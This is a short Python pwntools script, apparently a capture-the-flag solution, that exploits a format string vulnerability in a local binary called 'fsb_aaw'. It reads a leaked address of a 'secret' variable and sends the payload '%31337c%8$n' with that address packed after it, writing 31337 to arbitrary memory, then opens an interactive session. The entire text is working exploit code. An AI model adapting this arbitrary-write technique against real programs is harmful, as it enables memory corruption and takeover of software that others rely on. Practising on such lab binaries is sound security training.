from pwn import *

p = process("./fsb_aaw")

p.recvuntil("`secret`: ")

secret_addr = int(p.recvline()[:-1], 16)


payload = b"%31337c%8$n".ljust(16)
payload += p64(secret_addr)

# payload = b"%31337c".ljust(8)
# payload += b"%8$n".ljust(8)
# payload += p64(secret_addr)

p.sendline(payload)
p.interactive()
